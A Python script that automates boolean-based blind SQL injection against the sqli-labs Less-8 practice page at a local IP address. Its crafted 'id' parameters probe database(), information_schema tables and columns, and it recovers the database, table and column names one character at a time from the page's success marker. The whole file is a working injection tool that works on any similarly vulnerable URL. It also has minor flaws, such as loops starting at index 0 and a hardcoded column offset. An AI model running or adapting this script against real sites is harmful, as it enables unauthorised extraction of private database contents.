import requests
from lxml import etree

# 数据库操作

def GetDBNameLen(main_url):
    # 数据库名长度
    print("正在尝试获取数据库名长度...")
    print("*")
    url = main_url+"?id=1' and if(length(database())={},1,0) --+"
    for i in range(50):
        test_url = url.format(i)   # 当前测试的url
        req = requests.get(test_url)
        # 提取出成功登录的标志信息:You are in...........
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i

def GetDBName(len):
    # 数据库名
    print("正在尝试获取数据库名...")
    db_name = ""
    url = main_url+"?id=1' and if(ascii(substr(database(),{},1)) = {},1,0) --+"
    for i in range(len+1): # 试数据库名的第i个字符
        for j in range(48,122):
            test_url = url.format(i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                print("*第%d个字母是"%i+chr(j))
                db_name += chr(j)     # 将测试成功的字符添加到字符串变量
    return db_name

# 数据库下的表的操作

def GetTableCount(DBName):
    # 表的数量
    print("正在尝试获取表的数量")
    print("*")
    url = main_url+"?id=1' and if((select count(*)table_name from information_schema.tables where table_schema='{}')={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetTableNameLen(DBName):
    # 表名称长度
    print("正在尝试获取数据表名称长度...")
    print("*")
    url = main_url+"?id=1' and if((select length(table_name) from information_schema.tables where table_schema='{}' limit 0,1)={},1,0) --+"
    for i in range(50):
        test_url = url.format(DBName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i

def GetTableName(DBName,TableNameLen):
    # 表名称
    print("正在尝试获取数据表名称")
    table_name = ""
    url = main_url+"?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit 0,1),{},1))={},1,0) --+"
    for i in range(TableNameLen+1):
        for j in range(48, 122):
            test_url = url.format(DBName, i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                print("*第%d个字母是"%i+chr(j))
                table_name += chr(j)
    return table_name

# 字段操作
def GetCluCount(DBName,TableName):
    # 数据表里的字段数量
    print("正在获取字段数量")
    print("*")
    url = main_url+"?id=1' and if((select count(*)column_name from information_schema.columns where table_schema='{}'and table_name='{}')={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, TableName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetCluNameLen(DBName, TableName, CluNum):
    # 字段长度
    print("正在获取字段长度")
    print("*")
    url = main_url+"?id=1' and if((select length(column_name) from information_schema.columns where table_schema='{}' and table_name='{}' limit {},{})={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, TableName, CluNum-1, CluNum, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetCluName(DBName, TableName, CluNameLen):
    # 字段名
    print("正在获取字段名")
    clu_name = ""
    url = main_url+"?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit 1,1),{},1))={},1,0) --+"
    for i in range(CluNameLen+1):
        for j in range(48, 122):
            test_url = url.format(DBName, TableName, i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                print("*第%d个字母是"%i+chr(j))
                clu_name += chr(j)
    return clu_name



if __name__ == '__main__':
    main_url = "http://192.168.3.99/sqli-labs/Less-8/" # 注入的地址

    db_name_len = GetDBNameLen(main_url)
    print("数据库名长度为"+str(db_name_len)+"\n")

    db_name = GetDBName(db_name_len)
    print("数据库名为"+db_name+"\n")

    table_count = GetTableCount(db_name)
    print(db_name+"数据库里有"+str(table_count)+"个表\n")

    table_name_len = GetTableNameLen(db_name)
    print("表名称长度为"+ str(table_name_len)+"\n")

    table_name = GetTableName(db_name, table_name_len)
    print("表名为"+table_name+"\n")

    clu_count = GetCluCount(db_name, table_name)
    print(db_name+"数据库的"+table_name+"数据表有%d个字段"%clu_count+"\n")

    clu_name_len = GetCluNameLen(db_name, table_name, 1)
    print(db_name+"数据库的"+table_name+"数据表的第一个字段长为%d"%clu_name_len+"\n")

    print(GetCluName(db_name, table_name, clu_name_len))